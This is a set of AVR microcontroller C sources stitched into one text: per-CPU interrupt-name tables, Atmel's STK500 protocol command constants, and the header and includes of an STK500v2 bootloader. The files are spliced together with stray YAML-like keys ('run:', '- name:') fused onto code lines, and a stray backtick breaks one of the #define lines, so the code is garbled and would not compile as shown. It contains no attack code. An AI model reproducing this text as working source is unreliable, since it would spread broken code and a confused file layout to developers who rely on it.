	prog_char	gAvrInt_TIMER3_COMPC[]	PROGMEM	=	"TIMER3 COMPC";
#endif
#ifdef TIMER3_OVF_vect
	prog_char	gAvrInt_TIMER3_OVF[]	PROGMEM	=	"TIMER3 OVF";
#endif
#ifdef TIMER4_CAPT_vect
	prog_char	gAvrInt_TIMER4_CAPT[]	PROGMEM	=	"TIMER4 CAPT";
#endif
#ifdef TIMER4_COMPA_vect
	prog_char	gAvrInt_TIMER4_COMPA[]	PROGMEM	=	"TIMER4 COMPA";
#endif
#ifdef TIMER4_COMPB_vect
	prog_char	gAvrInt_TIMER4_COMPB[]	PROGMEM	=	"TIMER4 COMPB";
#endif
#ifdef TIMER4_COMPC_vect
	prog_char	gAvrInt_TIMER4_COMPC[]	PROGMEM	=	"TIMER4 COMPC";
#endif
#ifdef TIMER4_COMPD_vect
	prog_char	gAvrInt_TIMER4_COMPD[]	PROGMEM	=	"TIMER4 COMPD";
#endif
#ifdef TIMER4_OVF_vect
	prog_char	gAvrInt_TIMER4_OVF[]	PROGMEM	=	"TIMER4 OVF";
#endif
#ifdef TIMER4_FPF_vect
	prog_char	gAvrInt_TIMER4_FPF[]	PROGMEM	=	"TIMER4 Fault Protection";
#endif
#ifdef TIMER5_CAPT_vect
	prog_char	gAvrInt_TIMER5_CAPT[]	PROGMEM	=	"TIMER5 CAPT";
#endif
#ifdef TIMER5_COMPA_vect
	prog_char	gAvrInt_TIMER5_COMPA[]	PROGMEM	=	"TIMER5 COMPA";
#endif
#ifdef TIMER5_COMPB_vect
	prog_char	gAvrInt_TIMER5_COMPB[]	PROGMEM	=	"TIMER5 COMPB";
#endif
#ifdef TIMER5_COMPC_vect
	prog_char	gAvrInt_TIMER5_COMPC[]	PROGMEM	=	"TIMER5 COMPC";
#endif
#ifdef TIMER5_OVF_vect
	prog_char	gAvrInt_TIMER5_OVF[]	PROGMEM	=	"TIMER5 OVF";
#endif

//*	when there is only 1 usart
#if defined(USART_RX_vect) || defined(USART_RXC_vect)
	prog_char	gAvrInt_USART_RX[]		PROGMEM	=	"USART RX";
#endif
#if defined(USART_UDRE_vect)
	prog_char	gAvrInt_USART_UDRE[]	PROGMEM	=	"USART UDRE";
#endif
#if defined(USART_TX_vect) || defined(USART_TXC_vect)
	prog_char	gAvrInt_USART_TX[]		PROGMEM	=	"USART TX";
#endif


//*	usart 0
#if defined(USART0_RX_vect)
	prog_char	gAvrInt_USART0_RX[]		PROGMEM	=	"USART0 RX";
#endif
#if defined(USART0_UDRE_vect)
	prog_char	gAvrInt_USART0_UDRE[]	PROGMEM	=	"USART0 UDRE";
#endif
#if defined(USART0_TX_vect)
	prog_char	gAvrInt_USART0_TX[]		PROGMEM	=	"USART0 TX";
#endif


//*	usart 1
#ifdef USART1_RX_vect
	prog_char	gAvrInt_USART1_RX[]		PROGMEM	=	"USART1 RX";
#endif
#ifdef USART1_UDRE_vect
	prog_char	gAvrInt_USART1_UDRE[]	PROGMEM	=	"USART1 UDRE";
#endif
#ifdef USART1_TX_vect
	prog_char	gAvrInt_USART1_TX[]		PROGMEM	=	"USART1 TX";
#endif

//*	usart 2
#ifdef USART2_RX_vect
	prog_char	gAvrInt_USART2_RX[]		PROGMEM	=	"USART2 RX";
#endif
#ifdef USART2_UDRE_vect
	prog_char	gAvrInt_USART2_UDRE[]	PROGMEM	=	"USART2 UDRE";
#endif
#ifdef USART2_TX_vect
	prog_char	gAvrInt_USART2_TX[]		PROGMEM	=	"USART2 TX";
#endif

//*	usart 3
#ifdef USART3_RX_vect
	prog_char	gAvrInt_USART3_RX[]		PROGMEM	=	"USART3 RX";
#endif
#ifdef USART3_UDRE_vect
	prog_char	gAvrInt_USART3_UDRE[]	PROGMEM	=	"USART3 UDRE";
#endif
#ifdef USART3_TX_vect
	prog_char	gAvrInt_USART3_TX[]		PROGMEM	=	"USART3 TX";
#endif
#ifdef SPI_STC_vect
	prog_char	gAvrInt_SPI_STC[]		PROGMEM	=	"SPI STC";
#endif
#ifdef ADC_vect
	prog_char	gAvrInt_ADC[]			PROGMEM	=	"ADC";
#endif
#if defined(ANALOG_COMP_vect) || defined(ANA_COMP_vect)
	prog_char	gAvrInt_ANALOG_COMP[]	PROGMEM	=	"ANALOG COMP";
#endif
#if defined(EE_READY_vect) || defined(EE_RDY_vect)
	prog_char	gAvrInt_EE_READY[]		PROGMEM	=	"EE READY";
#endif
#ifdef TWI_vect
	prog_char	gAvrInt_TWI[]			PROGMEM	=	"TWI";
#endif
#if defined(SPM_READY_vect) || defined(SPM_RDY_vect)
	prog_char	gAvrInt_SPM_READY[]		PROGMEM	=	"SPM READY";
#endif
#ifdef USI_START_vect
	prog_char	gAvrInt_USI_START[]		PROGMEM	=	"USI START";
#endif
#ifdef USI_OVERFLOW_vect
	prog_char	gAvrInt_USI_OVERFLOW[]	PROGMEM	=	"USI OVERFLOW";
#endif
#ifdef USB_GEN_vect
	prog_char	gAvrInt_USB_General[]	PROGMEM	=	"USB General";
#endif
#ifdef USB_COM_vect
	prog_char	gAvrInt_USB_Endpoint[]	PROGMEM	=	"USB Endpoint";
#endif

#ifdef LCD_vect
	prog_char	gAvrInt_LCD_StartFrame[]	PROGMEM	=	"LCD Start of Frame";
#endif


//**************************************************************************************************
//*	these do not have vector defs and have to be done by CPU type
#if defined(__AVR_ATmega645__ ) || defined(__AVR_ATmega1281__) || defined(__AVR_ATmega2561__)
	prog_char	gAvrInt_NOT_USED[]		PROGMEM	=	"NOT_USED";
#endif
#if defined(__AVR_ATmega32U4__)
	prog_char	gAvrInt_RESERVED[]		PROGMEM	=	"Reserved";
#endif

	prog_char	gAvrInt_END[]			PROGMEM	=	"*";





//**************************************************************************************************
#if defined(__AVR_ATmega168__) || defined(__AVR_ATmega328P__)
#pragma mark __AVR_ATmega168__ / __AVR_ATmega328P__

#define	_INTERRUPT_NAMES_DEFINED_

PGM_P gInterruptNameTable[]	PROGMEM =
{

	gAvrInt_RESET,			//	1
	gAvrInt_INT0,			//	2
	gAvrInt_INT1,			//	3
	gAvrInt_PCINT0,			//	4
	gAvrInt_PCINT1,			//	5
	gAvrInt_PCINT2,			//	6
	gAvrInt_WDT,			//	7
	gAvrInt_TIMER2_COMPA,	//	8
	gAvrInt_TIMER2_COMPB,	//	9
	gAvrInt_TIMER2_OVF,		//	10
	gAvrInt_TIMER1_CAPT,	//	11
	gAvrInt_TIMER1_COMPA,	//	12
	gAvrInt_TIMER1_COMPB,	//	13
	gAvrInt_TIMER1_OVF,		//	14
	gAvrInt_TIMER0_COMPA,	//	15
	gAvrInt_TIMER0_COMPB,	//	16
	gAvrInt_TIMER0_OVF,		//	17
	gAvrInt_SPI_STC,		//	18
	gAvrInt_USART_RX,		//	19
	gAvrInt_USART_UDRE,	//	20
	gAvrInt_USART_TX,		//	21
	gAvrInt_ADC,			//	22
	gAvrInt_EE_READY,		//	23
	gAvrInt_ANALOG_COMP,	//	24
	gAvrInt_TWI,			//	25
	gAvrInt_SPM_READY,		//	26
};

#endif

//**************************************************************************************************
#pragma mark __AVR_ATmega169__
#if defined(__AVR_ATmega169__)

#define	_INTERRUPT_NAMES_DEFINED_

PGM_P gInterruptNameTable[]	PROGMEM =
{

	gAvrInt_RESET,			//	1
	gAvrInt_INT0,			//	2
	gAvrInt_PCINT0,			//	3
	gAvrInt_PCINT1,			//	4
	gAvrInt_TIMER2_COMP,	//	5
	gAvrInt_TIMER2_OVF,		//	6
	gAvrInt_TIMER1_CAPT,	//	7
	gAvrInt_TIMER1_COMPA,	//	8
	gAvrInt_TIMER1_COMPB,	//	9
	gAvrInt_TIMER1_OVF,		//	10
	gAvrInt_TIMER0_COMP,	//	11
	gAvrInt_TIMER0_OVF,		//	12
	gAvrInt_SPI_STC,		//	13
	gAvrInt_USART0_RX,		//	14
	gAvrInt_USART0_UDRE,	//	15
	gAvrInt_USART0_TX,		//	16
	gAvrInt_USI_START,		//	17
	gAvrInt_USI_OVERFLOW,	//	18
	gAvrInt_ANALOG_COMP,	//	19
	gAvrInt_ADC,			//	20
	gAvrInt_EE_READY,		//	21
	gAvrInt_SPM_READY,		//	22
	gAvrInt_LCD_StartFrame,	//	23

};

#endif


//**************************************************************************************************
#if defined(__AVR_ATmega640__) || defined(__AVR_ATmega1280__) || defined(__AVR_ATmega1281__) || defined(__AVR_ATmega2560__) || defined(__AVR_ATmega2561__)
#pragma mark __AVR_ATmega640__ __AVR_ATmega1280__ __AVR_ATmega1281__ __AVR_ATmega2560__ __AVR_ATmega2561__

#define	_INTERRUPT_NAMES_DEFINED_

PGM_P gInterruptNameTable[]	PROGMEM =
{

	gAvrInt_RESET,			//	1
	gAvrInt_INT0,			//	2
	gAvrInt_INT1,			//	3
	gAvrInt_INT2,			//	4
	gAvrInt_INT3,			//	5
	gAvrInt_INT4,			//	6
	gAvrInt_INT5,			//	7
	gAvrInt_INT6,			//	8
	gAvrInt_INT7,			//	9
	gAvrInt_PCINT0,			//	10
	gAvrInt_PCINT1,			//	11
#if defined(__AVR_ATmega640__) || defined(__AVR_ATmega1280__) || defined(__AVR_ATmega2560__)
	gAvrInt_PCINT2,			//	12
#else
	gAvrInt_NOT_USED,		//	12
#endif
	gAvrInt_WDT,			//	13
	gAvrInt_TIMER2_COMPA,	//	14
	gAvrInt_TIMER2_COMPB,	//	15
	gAvrInt_TIMER2_OVF,		//	16
	gAvrInt_TIMER1_CAPT,	//	17
	gAvrInt_TIMER1_COMPA,	//	18
	gAvrInt_TIMER1_COMPB,	//	19
	gAvrInt_TIMER1_COMPC,	//	20
	gAvrInt_TIMER1_OVF,		//	21
	gAvrInt_TIMER0_COMPA,	//	22
	gAvrInt_TIMER0_COMPB,	//	23
	gAvrInt_TIMER0_OVF,		//	24
	gAvrInt_SPI_STC,		//	25

	gAvrInt_USART0_RX,		//	26
	gAvrInt_USART0_UDRE,	//	27
	gAvrInt_USART0_TX,		//	28
	gAvrInt_ANALOG_COMP,	//	29
	gAvrInt_ADC,			//	30
	gAvrInt_EE_READY,		//	31

	gAvrInt_TIMER3_CAPT,	//	32
	gAvrInt_TIMER3_COMPA,	//	33
	gAvrInt_TIMER3_COMPB,	//	34
	gAvrInt_TIMER3_COMPC,	//	35
	gAvrInt_TIMER3_OVF,		//	36

	gAvrInt_USART1_RX,		//	37
	gAvrInt_USART1_UDRE,	//	38
	gAvrInt_USART1_TX,		//	39
	gAvrInt_TWI,			//	40
	gAvrInt_SPM_READY,		//	41
#if defined(__AVR_ATmega640__) || defined(__AVR_ATmega1280__) || defined(__AVR_ATmega2560__)
	gAvrInt_TIMER4_CAPT,	//	42
#else
	gAvrInt_NOT_USED,		//	42
#endif
	gAvrInt_TIMER4_COMPA,	//	43
	gAvrInt_TIMER4_COMPB,	//	44
	gAvrInt_TIMER4_COMPC,	//	45
	gAvrInt_TIMER4_OVF,		//	46
#if defined(__AVR_ATmega640__) || defined(__AVR_ATmega1280__) || defined(__AVR_ATmega2560__)
	gAvrInt_TIMER5_CAPT,	//	47
#else
	gAvrInt_NOT_USED,		//	47
#endif
	gAvrInt_TIMER5_COMPA,	//	48
	gAvrInt_TIMER5_COMPB,	//	49
	gAvrInt_TIMER5_COMPC,	//	50
	gAvrInt_TIMER5_OVF,		//	51

#if defined(__AVR_ATmega640__) || defined(__AVR_ATmega1280__) || defined(__AVR_ATmega2560__)
	gAvrInt_USART2_RX,		//	52
	gAvrInt_USART2_UDRE,	//	53
	gAvrInt_USART2_TX,		//	54

	gAvrInt_USART3_RX,		//	55
	gAvrInt_USART3_UDRE,	//	56
	gAvrInt_USART3_TX,		//	57
#endif

};

#endif



//**************************************************************************************************
#if defined(__AVR_ATmega324P__ ) || defined(__AVR_ATmega644__ ) || defined(__AVR_ATmega644P__) || defined(__AVR_ATmega1284P__)
#pragma mark __AVR_ATmega324P__  __AVR_ATmega644__ __AVR_ATmega644P__ __AVR_ATmega1284P__

#define	_INTERRUPT_NAMES_DEFINED_

PGM_P gInterruptNameTable[]	PROGMEM =
{

	gAvrInt_RESET,			//	1
	gAvrInt_INT0,			//	2
	gAvrInt_INT1,			//	3
	gAvrInt_INT2,			//	4
	gAvrInt_PCINT0,			//	5
	gAvrInt_PCINT1,			//	6
	gAvrInt_PCINT2,			//	7
	gAvrInt_PCINT3,			//	8
	gAvrInt_WDT,			//	9
	gAvrInt_TIMER2_COMPA,	//	10
	gAvrInt_TIMER2_COMPB,	//	11
	gAvrInt_TIMER2_OVF,		//	12
	gAvrInt_TIMER1_CAPT,	//	13
	gAvrInt_TIMER1_COMPA,	//	14
	gAvrInt_TIMER1_COMPB,	//	15
	gAvrInt_TIMER1_OVF,		//	16
	gAvrInt_TIMER0_COMPA,	//	17
	gAvrInt_TIMER0_COMPB,	//	18
	gAvrInt_TIMER0_OVF,		//	19
	gAvrInt_SPI_STC,		//	20
	gAvrInt_USART0_RX,		//	21
	gAvrInt_USART0_UDRE,	//	22
	gAvrInt_USART0_TX,		//	23
	gAvrInt_ANALOG_COMP,	//	24
	gAvrInt_ADC,			//	25
	gAvrInt_EE_READY,		//	26
	gAvrInt_TWI,			//	27
	gAvrInt_SPM_READY,		//	28

#if defined(__AVR_ATmega324P__ ) || defined(__AVR_ATmega644P__)
	gAvrInt_USART1_RX,		//	29
	gAvrInt_USART1_UDRE,	//	30
	gAvrInt_USART1_TX,		//	31
#endif

};


#endif

//**************************************************************************************************
#if defined(__AVR_ATmega645__ )
#pragma mark __AVR_ATmega645__

#define	_INTERRUPT_NAMES_DEFINED_

PGM_P gInterruptNameTable[]	PROGMEM =
{

	gAvrInt_RESET,			//	1
	gAvrInt_INT0,			//	2
	gAvrInt_PCINT0,			//	3
	gAvrInt_PCINT1,			//	4
	gAvrInt_TIMER2_COMP,	//	5
	gAvrInt_TIMER2_OVF,		//	6
	gAvrInt_TIMER1_CAPT,	//	7
	gAvrInt_TIMER1_COMPA,	//	8
	gAvrInt_TIMER1_COMPB,	//	9
	gAvrInt_TIMER1_OVF,		//	10
	gAvrInt_TIMER0_COMP,	//	11
	gAvrInt_TIMER0_OVF,		//	12
	gAvrInt_SPI_STC,		//	13
	gAvrInt_USART0_RX,		//	14
	gAvrInt_USART0_UDRE,	//	15
	gAvrInt_USART0_TX,		//	16
	gAvrInt_USI_START,		//	17
	gAvrInt_USI_OVERFLOW,	//	18
	gAvrInt_ANALOG_COMP,	//	19
	gAvrInt_ADC,			//	20
	gAvrInt_EE_READY,		//	21
	gAvrInt_SPM_READY,		//	22
	gAvrInt_NOT_USED,		//	23

#if defined(__AVR_ATmega3250__) || defined(__AVR_ATmega6450__)
	gAvrInt_PCINT2,			//	24
	gAvrInt_PCINT3,			//	25
#endif
};


#endif


//**************************************************************************************************
#if defined(__AVR_ATmega32__ )
#pragma mark __AVR_ATmega32__

#define	_INTERRUPT_NAMES_DEFINED_

PGM_P gInterruptNameTable[]	PROGMEM =
{

	gAvrInt_RESET,			//	1
	gAvrInt_INT0,			//	2
	gAvrInt_INT1,			//	3
	gAvrInt_INT2,			//	4
	gAvrInt_TIMER2_COMP,	//	5
	gAvrInt_TIMER2_OVF,		//	6
	gAvrInt_TIMER1_CAPT,	//	7
	gAvrInt_TIMER1_COMPA,	//	8
	gAvrInt_TIMER1_COMPB,	//	9
	gAvrInt_TIMER1_OVF,		//	10
	gAvrInt_TIMER0_COMP,	//	11
	gAvrInt_TIMER0_OVF,		//	12
	gAvrInt_SPI_STC,		//	13
	gAvrInt_USART_RX,		//	14
	gAvrInt_USART_UDRE,		//	15
	gAvrInt_USART_TX,		//	16
	gAvrInt_ADC,			//	17
	gAvrInt_EE_READY,		//	18
	gAvrInt_ANALOG_COMP,	//	19
	gAvrInt_TWI,			//	20
	gAvrInt_SPM_READY,		//	21

};


#endif

//**************************************************************************************************
#if defined(__AVR_ATmega32U4__)
#pragma mark __AVR_ATmega32U4__
//*	teensy 2.0
//*	http://www.pjrc.com/teensy/pinout.html
#define	_INTERRUPT_NAMES_DEFINED_


PGM_P gInterruptNameTable[]	PROGMEM =
{

	gAvrInt_RESET,			//	1
	gAvrInt_INT0,			//	2
	gAvrInt_INT1,			//	3
	gAvrInt_INT2,			//	4
	gAvrInt_INT3,			//	5
	gAvrInt_RESERVED,		//	6
	gAvrInt_RESERVED,		//	7
	gAvrInt_INT6,			//	8
	gAvrInt_RESERVED,		//	9
	gAvrInt_PCINT0,			//	10
	gAvrInt_USB_General,	//	11
	gAvrInt_USB_Endpoint,	//	12
	gAvrInt_WDT,			//	13
	gAvrInt_RESERVED,		//	14
	gAvrInt_RESERVED,		//	15
	gAvrInt_RESERVED,		//	16
	gAvrInt_TIMER1_CAPT,	//	17
	gAvrInt_TIMER1_COMPA,	//	18
	gAvrInt_TIMER1_COMPB,	//	19
	gAvrInt_TIMER1_COMPC,	//	20
	gAvrInt_TIMER1_OVF,		//	21
	gAvrInt_TIMER0_COMPA,	//	22
	gAvrInt_TIMER0_COMPB,	//	23
	gAvrInt_TIMER0_OVF,		//	24
	gAvrInt_SPI_STC,		//	25

	gAvrInt_USART1_RX,		//	26
	gAvrInt_USART1_UDRE,	//	27
	gAvrInt_USART1_TX,		//	28
	gAvrInt_ANALOG_COMP,	//	29
	
	gAvrInt_ADC,			//	30
	gAvrInt_EE_READY,		//	31

	gAvrInt_TIMER3_CAPT,	//	32
	gAvrInt_TIMER3_COMPA,	//	33
	gAvrInt_TIMER3_COMPB,	//	34
	gAvrInt_TIMER3_COMPC,	//	35
	gAvrInt_TIMER3_OVF,		//	36
	gAvrInt_TWI,			//	37
	gAvrInt_SPM_READY,		//	38

	gAvrInt_TIMER4_COMPA,	//	39
	gAvrInt_TIMER4_COMPB,	//	40
	gAvrInt_TIMER4_COMPD,	//	41
	gAvrInt_TIMER4_OVF,		//	42
	gAvrInt_TIMER4_FPF,		//	43
};

#endif

//**************************************************************************************************
#if defined(__AVR_AT90USB1286__)
#pragma mark __AVR_AT90USB1286__
//*	teensy++ 2.0
//*	http://www.pjrc.com/teensy/pinout.html
#define	_INTERRUPT_NAMES_DEFINED_


PGM_P gInterruptNameTable[]	PROGMEM =
{

	gAvrInt_RESET,			//	1
	gAvrInt_INT0,			//	2
	gAvrInt_INT1,			//	3
	gAvrInt_INT2,			//	4
	gAvrInt_INT3,			//	5
	gAvrInt_INT4,			//	6
	gAvrInt_INT5,			//	7
	gAvrInt_INT6,			//	8
	gAvrInt_INT7,			//	9
	gAvrInt_PCINT0,			//	10
	gAvrInt_USB_General,	//	11
	gAvrInt_USB_Endpoint,	//	12
	gAvrInt_WDT,			//	13
	gAvrInt_TIMER2_COMPA,	//	14
	gAvrInt_TIMER2_COMPB,	//	15
	gAvrInt_TIMER2_OVF,		//	16
	gAvrInt_TIMER1_CAPT,	//	17
	gAvrInt_TIMER1_COMPA,	//	18
	gAvrInt_TIMER1_COMPB,	//	19
	gAvrInt_TIMER1_COMPC,	//	20
	gAvrInt_TIMER1_OVF,		//	21
	gAvrInt_TIMER0_COMPA,	//	22
	gAvrInt_TIMER0_COMPB,	//	23
	gAvrInt_TIMER0_OVF,		//	24
	gAvrInt_SPI_STC,		//	25

	gAvrInt_USART1_RX,		//	26
	gAvrInt_USART1_UDRE,	//	27
	gAvrInt_USART1_TX,		//	28
	gAvrInt_ANALOG_COMP,	//	29
	
	gAvrInt_ADC,			//	30
	gAvrInt_EE_READY,		//	31

	gAvrInt_TIMER3_CAPT,	//	32
	gAvrInt_TIMER3_COMPA,	//	33
	gAvrInt_TIMER3_COMPB,	//	34
	gAvrInt_TIMER3_COMPC,	//	35
	gAvrInt_TIMER3_OVF,		//	36
	gAvrInt_TWI,			//	37
	gAvrInt_SPM_READY,		//	38

};

#endif




//**************************************************************************************************
#if defined(__AVR_ATmega128__)
#pragma mark __AVR_ATmega128__
#define	_INTERRUPT_NAMES_DEFINED_


PGM_P gInterruptNameTable[]	PROGMEM =
{

	gAvrInt_RESET,			//	1
	gAvrInt_INT0,			//	2
	gAvrInt_INT1,			//	3
	gAvrInt_INT2,			//	4
	gAvrInt_INT3,			//	5
	gAvrInt_INT4,			//	6
	gAvrInt_INT5,			//	7
	gAvrInt_INT6,			//	8
	gAvrInt_INT7,			//	9
	gAvrInt_TIMER2_COMP,	//	10
	gAvrInt_TIMER2_OVF,		//	11
	gAvrInt_TIMER1_CAPT,	//	12
	gAvrInt_TIMER1_COMPA,	//	13
	gAvrInt_TIMER1_COMPB,	//	14
	gAvrInt_TIMER1_OVF,		//	15
	gAvrInt_TIMER0_COMP,	//	16
	gAvrInt_TIMER0_OVF,		//	17
	gAvrInt_SPI_STC,		//	18
	gAvrInt_USART0_RX,		//	19
	gAvrInt_USART0_UDRE,	//	20
	gAvrInt_USART0_TX,		//	21
	gAvrInt_ADC,			//	22
	gAvrInt_EE_READY,		//	23
	gAvrInt_ANALOG_COMP,	//	24
	gAvrInt_TIMER1_COMPC,	//	25
	gAvrInt_TIMER3_CAPT,	//	26
	gAvrInt_TIMER3_COMPA,	//	27
	gAvrInt_TIMER3_COMPB,	//	28
	gAvrInt_TIMER3_COMPC,	//	29
	gAvrInt_TIMER3_OVF,		//	30
	gAvrInt_USART1_RX,		//	31
	gAvrInt_USART1_UDRE,	//	32
	gAvrInt_USART1_TX,		//	33
	gAvrInt_TWI,			//	34
	gAvrInt_SPM_READY,		//	35

};

#endif

#if !defined(_INTERRUPT_NAMES_DEFINED_)
	#warning	No interrupt string defs for this cpu
#endif
      run: //**** ATMEL AVR - A P P L I C A T I O N   N O T E  ************************
//*
//* Title:		AVR068 - STK500 Communication Protocol
//* Filename:		command.h
//* Version:		1.0
//* Last updated:	31.01.2005
//*
//* Support E-mail:	avr@atmel.com
//*
//**************************************************************************

// *****************[ STK message constants ]***************************

#define MESSAGE_START                       0x1B        //= ESC = 27 decimal
#define TOKEN                               0x0E

// *****************[ STK general command constants ]**************************

#define CMD_SIGN_ON                         0x01
#define CMD_SET_PARAMETER                   0x02
#define CMD_GET_PARAMETER                   0x03
#define CMD_SET_DEVICE_PARAMETERS           0x04
#define CMD_OSCCAL                          0x05
#define CMD_LOAD_ADDRESS                    0x06
#define CMD_FIRMWARE_UPGRADE                0x07


// *****************[ STK ISP command constants ]******************************

#define CMD_ENTER_PROGMODE_ISP              0x10
#define CMD_LEAVE_PROGMODE_ISP              0x11
#define CMD_CHIP_ERASE_ISP                  0x12
#define CMD_PROGRAM_FLASH_ISP               0x13
#define CMD_READ_FLASH_ISP                  0x14
#define CMD_PROGRAM_EEPROM_ISP              0x15
#define CMD_READ_EEPROM_ISP                 0x16
#define CMD_PROGRAM_FUSE_ISP                0x17
#define CMD_READ_FUSE_ISP                   0x18
#define CMD_PROGRAM_LOCK_ISP                0x19
#define CMD_READ_LOCK_ISP                   0x1A
#define CMD_READ_SIGNATURE_ISP              0x1B
#define CMD_READ_OSCCAL_ISP                 0x1C
#define CMD_SPI_MULTI                       0x1D

// *****************[ STK PP command constants ]*******************************

#define CMD_ENTER_PROGMODE_PP               0x20
#define CMD_LEAVE_PROGMODE_PP               0x21
#define CMD_CHIP_ERASE_PP                   0x22
#define CMD_PROGRAM_FLASH_PP                0x23
#define CMD_READ_FLASH_PP                   0x24
#define CMD_PROGRAM_EEPROM_PP               0x25
#define CMD_READ_EEPROM_PP                  0x26
#define CMD_PROGRAM_FUSE_PP                 0x27
#define CMD_READ_FUSE_PP                    0x28
#define CMD_PROGRAM_LOCK_PP                 0x29
#define CMD_READ_LOCK_PP                    0x2A
#define CMD_READ_SIGNATURE_PP               0x2B
#define CMD_READ_OSCCAL_PP                  0x2C    

#define CMD_SET_CONTROL_STACK               0x2D

// *****************[ STK HVSP command constants ]*****************************

#define CMD_ENTER_PROGMODE_HVSP             0x30
#define CMD_LEAVE_PROGMODE_HVSP             0x31
#define CMD_CHIP_ERASE_HVSP                 0x32
#define CMD_PROGRAM_FLASH_HVSP  `     0x33
#define CMD_READ_FLASH_HVSP                 0x34
#define CMD_PROGRAM_EEPROM_HVSP             0x35
#define CMD_READ_EEPROM_HVSP                0x36
#define CMD_PROGRAM_FUSE_HVSP               0x37
#define CMD_READ_FUSE_HVSP                  0x38
#define CMD_PROGRAM_LOCK_HVSP               0x39
#define CMD_READ_LOCK_HVSP                  0x3A
#define CMD_READ_SIGNATURE_HVSP             0x3B
#define CMD_READ_OSCCAL_HVSP                0x3C

// *****************[ STK status constants ]***************************

// Success
#define STATUS_CMD_OK                       0x00

// Warnings
#define STATUS_CMD_TOUT                     0x80
#define STATUS_RDY_BSY_TOUT                 0x81
#define STATUS_SET_PARAM_MISSING            0x82

// Errors
#define STATUS_CMD_FAILED                   0xC0
#define STATUS_CKSUM_ERROR                  0xC1
#define STATUS_CMD_UNKNOWN                  0xC9

// *****************[ STK parameter constants ]***************************
#define PARAM_BUILD_NUMBER_LOW              0x80
#define PARAM_BUILD_NUMBER_HIGH             0x81
#define PARAM_HW_VER                        0x90
#define PARAM_SW_MAJOR                      0x91
#define PARAM_SW_MINOR                      0x92
#define PARAM_VTARGET                       0x94
#define PARAM_VADJUST                       0x95
#define PARAM_OSC_PSCALE                    0x96
#define PARAM_OSC_CMATCH                    0x97
#define PARAM_SCK_DURATION                  0x98
#define PARAM_TOPCARD_DETECT                0x9A
#define PARAM_STATUS                        0x9C
#define PARAM_DATA                          0x9D
#define PARAM_RESET_POLARITY                0x9E
#define PARAM_CONTROLLER_INIT               0x9F

// *****************[ STK answer constants ]***************************

#define ANSWER_CKSUM_ERROR                  0xB0

    - name: /*****************************************************************************
Title:     STK500v2 compatible bootloader
           Modified for Wiring board ATMega128-16MHz
Author:    Peter Fleury <pfleury@gmx.ch>   http://jump.to/fleury
File:      $Id: stk500boot.c,v 1.11 2006/06/25 12:39:17 peter Exp $
Compiler:  avr-gcc 3.4.5 or 4.1 / avr-libc 1.4.3
Hardware:  All AVRs with bootloader support, tested with ATmega8
License:   GNU General Public License

Modified:  Worapoht Kornkaewwattanakul <dev@avride.com>   http://www.avride.com
Date:      17 October 2007
Update:    1st, 29 Dec 2007 : Enable CMD_SPI_MULTI but ignore unused command by return 0x00 byte response..
Compiler:  WINAVR20060421
Description: add timeout feature like previous Wiring bootloader

DESCRIPTION:
    This program allows an AVR with bootloader capabilities to
    read/write its own Flash/EEprom. To enter Programming mode
    an input pin is checked. If this pin is pulled low, programming mode
    is entered. If not, normal execution is done from $0000
    "reset" vector in Application area.
    Size fits into a 1024 word bootloader section
	when compiled with avr-gcc 4.1
	(direct replace on Wiring Board without fuse setting changed)

USAGE:
    - Set AVR MCU type and clock-frequency (F_CPU) in the Makefile.
    - Set baud rate below (AVRISP only works with 115200 bps)
    - compile/link the bootloader with the supplied Makefile
    - program the "Boot Flash section size" (BOOTSZ fuses),
      for boot-size 1024 words:  program BOOTSZ01
    - enable the BOOT Reset Vector (program BOOTRST)
    - Upload the hex file to the AVR using any ISP programmer
    - Program Boot Lock Mode 3 (program BootLock 11 and BootLock 12 lock bits) // (leave them)
    - Reset your AVR while keeping PROG_PIN pulled low // (for enter bootloader by switch)
    - Start AVRISP Programmer (AVRStudio/Tools/Program AVR)
    - AVRISP will detect the bootloader
    - Program your application FLASH file and optional EEPROM file using AVRISP

Note:
    Erasing the device without flashing, through AVRISP GUI button "Erase Device"
    is not implemented, due to AVRStudio limitations.
    Flash is always erased before programming.

	AVRdude:
	Please uncomment #define REMOVE_CMD_SPI_MULTI when using AVRdude.
	Comment #define REMOVE_PROGRAM_LOCK_BIT_SUPPORT to reduce code size
	Read Fuse Bits and Read/Write Lock Bits is not supported

NOTES:
    Based on Atmel Application Note AVR109 - Self-programming
    Based on Atmel Application Note AVR068 - STK500v2 Protocol

LICENSE:
    Copyright (C) 2006 Peter Fleury

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

*****************************************************************************/

//************************************************************************
//*	Edit History
//************************************************************************
//*	Jul  7,	2010	<MLS> = Mark Sproul msproul@skycharoit.com
//*	Jul  7,	2010	<MLS> Working on mega2560. No Auto-restart
//*	Jul  7,	2010	<MLS> Switched to 8K bytes (4K words) so that we have room for the monitor
//*	Jul  8,	2010	<MLS> Found older version of source that had auto restart, put that code back in
//*	Jul  8,	2010	<MLS> Adding monitor code
//*	Jul 11,	2010	<MLS> Added blinking LED while waiting for download to start
//*	Jul 11,	2010	<MLS> Added EEPROM test
//*	Jul 29,	2010	<MLS> Added recchar_timeout for timing out on bootloading
//*	Aug 23,	2010	<MLS> Added support for atmega2561
//*	Aug 26,	2010	<MLS> Removed support for BOOT_BY_SWITCH
//*	Sep  8,	2010	<MLS> Added support for atmega16
//************************************************************************



#include	<inttypes.h>
#include	<avr/io.h>
#include	<avr/interrupt.h>
#include	<avr/boot.h>
#include	<avr/pgmspace.h>
#include	<util/delay.h>
#include	<avr/eeprom.h>
#include	<avr/common.h>
#include	<stdlib.h>
#include	"command.h"


//#if defined(_MEGA_BOARD_) || defined(_BOARD_AMBER128_) || defined(__AVR_ATmega1280__) || defined(__AVR_ATmega2560__) || defined(__AVR_ATmega2561__) || defined(__AVR_ATmega1284P__) || defined(ENABLE_MONITOR)
//	#define		ENABLE_MONITOR
//	static void	RunMonitor(void);
//#endif

//#define	_DEBUG_SERIAL_
#define	_DEBUG_WITH_LEDS_

/*
 * Uncomment the following lines to save code space
 */
//#define	REMOVE_PROGRAM_LOCK_BIT_SUPPORT		// disable program lock bits
//#define	REMOVE_BOOTLOADER_LED				// no LED to show active bootloader
//#define	REMOVE_CMD_SPI_MULTI				// disable processing of SPI_MULTI commands, Remark this line for AVRDUDE <Worapoht>
//



